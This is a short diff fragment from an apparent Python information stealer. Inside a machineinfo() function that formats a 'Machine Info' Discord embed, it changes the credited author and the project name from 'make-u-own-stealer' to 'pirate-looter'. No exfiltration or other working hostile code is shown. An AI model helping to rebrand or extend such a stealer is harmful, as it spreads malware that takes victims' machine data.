@@ -27,9 +27,9 @@ def machineinfo():
         "embeds": [
             {
                 "title": "Machine Info",
-                "username": "github.com/lawxsz",
+                "username": "github.com/real-fbdn",
                 "avatar_url": "https://cdn.discordapp.com/attachments/1073683220148785222/1077827511691530240/photo_2022-10-01_18-57-36.jpg",
-                "description": "Github.com/Lawxsz/make-u-own-stealer",
+                "description": "github.com/real-fbdn/pirate-looter",
                 "fields": [
                     {
                         "name": ":computer: PC",
